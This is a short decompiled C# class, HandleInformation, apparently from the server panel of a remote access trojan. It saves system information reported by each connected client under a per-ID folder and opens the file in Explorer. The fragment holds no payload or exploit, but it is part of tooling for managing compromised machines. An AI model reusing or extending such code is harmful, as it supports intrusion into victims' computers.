using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200003C RID: 60
	public class HandleInformation
	{
		// Token: 0x060002CA RID: 714 RVA: 0x00014D14 File Offset: 0x00014D14
		public void AddToInformationList(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString + "\\Information");
				string text2 = text + "\\Information.txt";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllText(text2, unpack_msgpack.ForcePathObject("InforMation").AsString);
				Process.Start("explorer.exe", text2);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}
	}
}
